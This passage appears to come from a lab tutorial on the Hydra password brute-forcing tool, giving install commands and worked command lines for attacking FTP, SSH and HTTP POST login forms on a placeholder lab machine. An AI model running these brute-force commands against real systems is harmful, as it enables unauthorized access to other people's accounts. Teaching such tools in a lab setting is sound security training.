 you can install Hydra on an Ubuntu or Fedora system by executing `apt install hydra` or `dnf install hydra`. Furthermore, you can download it from its official [Hydra repository(opens in new tab)](https://github.com/vanhauser-thc/thc-hydra).

## Hydra Commands

The options we pass into Hydra depend on which service (protocol) we’re attacking. For example, if we wanted to brute force FTP with the username being `user` and a password list being `passlist.txt`, we’d use the following command:

`hydra -l user -P passlist.txt ftp://MACHINE_IP`

For this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method).

### SSH

`hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh`

|Option|Description|
|---|---|
|`-l`|specifies the (SSH) username for login|
|`-P`|indicates a list of passwords|
|`-t`|sets the number of threads to spawn|

For example, `hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh` will run with the following arguments:

- Hydra will use `root` as the username for `ssh`
- It will try the passwords in the `passwords.txt` file
- There will be four threads running in parallel as indicated by `-t 4`

### Post Web Form

We can use Hydra to brute force web forms, too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser’s network tab (in developer tools) to see the request types or view the source code.

`sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"`

|Option|Description|
|---|---|
|`-l`|the username for (web form) login|
|`-P`|the password list to use|
|`http-post-form`|The type of the form is POST|
|`<path>`|the login page URL, for example, `login.php`|
|`<login_credentials>`|the username and password used to log in, for example, `username=^USER^&password=^PASS^`|
|`<invalid_response>`|part of the response when the login fails|
|`-V`|verbose output for every attempt|

Below is a more concrete example Hydra command to brute force a POST login form:

`hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

- The login page is only `/`, i.e., the main IP address.
- The `username` is the form field where the username is entered
- The specified username(s) will replace `^USER^`
- The `password` is the form field where the password is entered
- The provided passwords will be replacing `^PASS^`
- Finally, `F=incorrect` is a string that appears in the server reply when the login fails

On a side note, if the web server is listening on a non-default port number, you can explicitly specify the port number using `-s <port>`, for example:

		`hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V`
